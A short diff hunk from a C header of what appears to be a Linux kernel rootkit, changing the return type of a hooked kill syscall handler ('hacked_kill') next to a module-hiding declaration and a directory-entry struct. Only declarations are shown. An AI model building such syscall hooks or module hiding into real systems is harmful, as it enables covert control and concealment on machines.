@@ -19,10 +19,10 @@ void
 module_hide(void);
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-asmlinkage int
+asmlinkage long
 hacked_kill(const struct pt_regs *pt_regs);
 #else
-asmlinkage int
+asmlinkage long
 hacked_kill(pid_t pid, int sig);
 #endif
 struct linux_dirent {
